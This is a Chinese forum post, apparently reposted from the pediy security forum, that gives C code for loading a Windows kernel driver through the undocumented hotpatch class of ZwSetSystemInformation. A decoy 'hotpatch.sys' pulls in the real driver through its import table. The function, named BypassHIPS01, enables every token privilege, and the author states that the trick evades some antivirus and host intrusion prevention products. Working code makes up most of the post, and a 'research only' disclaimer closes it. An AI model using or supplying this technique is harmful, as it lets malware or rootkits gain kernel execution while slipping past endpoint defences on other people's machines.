
# 利用系统 Hotpatch 加载驱动的一种比较取巧的方法

> 原文：`www.pediy.com/kssd/pediy12/144503.html`

其实没啥可讲，也没啥可说的，这代码同样的是很老的代码，只是一直没放的原因是为了保持互联网和谐，但是都快圣诞，还是放一下吧~

首先这是一个基于 `ZwSetSystemInformation` 加载驱动的方法，

其次这是一个只被部分杀毒拦截的方法别指望这个能过 360，因为 mj 早知道这个~

然后说一下为啥是取巧，因为这是利用 `MmLoadSystemImage` 对驱动文件处理时，会自动加载并执行文件的导入表的其他驱动，于是你懂得。（具体参考 我那篇 `ZwLoadDriver` 的文章：`http://bbs.pediy.com/showthread.php?t=142021`）

最后上代码

```c
//Jan 4 2005
//Enable specific privilege
BOOL EnableSpecificPrivilege(BOOL bEnable, LPCTSTR Name)
{
    BOOL bResult = FALSE;
    HANDLE hToken;
    TOKEN_PRIVILEGES TokenPrivileges;

    if(OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, &hToken) == 0)
    {
        return FALSE;
    }

    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[0].Attributes = bEnable ? SE_PRIVILEGE_ENABLED : 0;
    bResult = LookupPrivilegeValue(NULL, Name, &TokenPrivileges.Privileges[0].Luid);
    if(!bResult)
    {
        CloseHandle(hToken);
        return FALSE;
    }

    bResult = AdjustTokenPrivileges(hToken, FALSE, &TokenPrivileges, sizeof(TOKEN_PRIVILEGES), NULL, NULL);
    if(GetLastError() != ERROR_SUCCESS || !bResult)
    {
        CloseHandle(hToken);
        return FALSE;
    }

    CloseHandle(hToken);
    return TRUE;
}

//Jan 4 2005
//Enable all privilege, return num of privileges successfully enabled
DWORD EnableAllPrivilege(BOOL bEnable)
{
    DWORD count = 0;
    ///
    count += EnableSpecificPrivilege(bEnable, SE_ASSIGNPRIMARYTOKEN_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_AUDIT_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_BACKUP_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_CHANGE_NOTIFY_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_CREATE_PAGEFILE_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_CREATE_PERMANENT_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_CREATE_TOKEN_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_DEBUG_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_INC_BASE_PRIORITY_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_INCREASE_QUOTA_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_LOAD_DRIVER_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_LOCK_MEMORY_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_PROF_SINGLE_PROCESS_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_REMOTE_SHUTDOWN_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_RESTORE_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_SECURITY_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_SHUTDOWN_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_SYSTEM_ENVIRONMENT_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_SYSTEM_PROFILE_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_SYSTEMTIME_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_TAKE_OWNERSHIP_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_TCB_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_UNSOLICITED_INPUT_NAME);
    count += EnableSpecificPrivilege(bEnable, SE_MACHINE_ACCOUNT_NAME);

    return count;
}

//Mar 7 2006
BOOL BypassHIPS01()
{
    struct {
        SYSTEM_HOTPATCH_CODE_INFORMATION shci;
        WCHAR KernelPath[MAX_PATH];
    } s;
    WCHAR FileName[MAX_PATH];
    WCHAR RealSysName[MAX_PATH];

    EnableAllPrivilege(TRUE);
    ZWSETSYSTEMINFORMATION pNtSetSystemInformation = (ZWSETSYSTEMINFORMATION)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "ZwSetSystemInformation");
    //LPTHREAD_START_ROUTINE pLdrHotPatchRoutine = (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle(_T("ntdll.dll")), "LdrHotPatchRoutine");

    GetModuleFileNameW(NULL, FileName, MAX_PATH);
    (wcsrchr(FileName, L'\\'))[0] = L'\\0';
    OutputDebugStringW(FileName);

    StringCbPrintfW(RealSysName, MAX_PATH, L"\\??\\%s\\HotpatchSys.sys", FileName);
    OutputDebugStringW(RealSysName);

    if(pNtSetSystemInformation)
    {
        s.shci.Flags = HOTP_USE_MODULE | HOTP_PATCH_APPLY | HOTP_KERNEL_MODULE;
        s.shci.InfoSize = sizeof(s);
        s.shci.KernelInfo.NameOffset = (WORD)((ULONG_PTR)s.KernelPath - (ULONG_PTR)&s.shci);
        s.shci.KernelInfo.NameLegth = 2 * wcslen(RealSysName);
        StringCbCopyW(s.KernelPath, MAX_PATH, RealSysName);
        OutputDebugStringW(s.KernelPath);

        //_tprintf(_T("Flags:%x,Size:%x,Offset:%x,NameLegth:%x\r\n"), s.shci.Flags, s.shci.InfoSize, s.shci.KernelInfo.NameOffset, s.shci.KernelInfo.NameLegth);
        //s.shci.UserModeInfo.NameOffset = (WORD)((ULONG_PTR)s.SourceName - (ULONG_PTR)&s.shci);
        //s.shci.UserModeInfo.NameLegth = sizeof(SOURCE_NAME) - sizeof(WCHAR);
        //s.shci.UserModeInfo.TargetNameOffset = (WORD)((ULONG_PTR)s.TargetName - (ULONG_PTR)&s.shci);
        //s.shci.UserModeInfo.TargetNameLegth = sizeof(TARGET_NAME) - sizeof(WCHAR);
        //s.shci.UserModeInfo.PatchingFinished = FALSE;
        //lstrcpynW(s.SourceName, SOURCE_NAME, sizeof(s.SourceName));
        //lstrcpynW(s.TargetName, TARGET_NAME, sizeof(s.TargetName));
        // hThread = CreateThread(NULL, 0, pLdrHotPatchRoutine, &s, 0, NULL);
        // WaitForSingleObject(hThread, INFINITE);
        // CloseHandle(hThread);

        NTSTATUS x = pNtSetSystemInformation(SystemHotpatchInformation, &s, sizeof(s));
        if(x == STATUS_INVALID_IMAGE_FORMAT)
        {
            return TRUE;
        }
    }
    return FALSE;
}
```

加载的 `hotpatch.sys` 其实是一个空壳，真正的驱动是由它的导入表导入的某个内核动态库驱动~

需要的 `hotpatch` 定义用的头文件在本帖的附件里给出~

`HotPatch.rar`

严重声明：本帖给出的代码仅供研究学习之用，如果用在他途，各种后果与本人无关。

欢迎交流，QQ 群：`171797360`
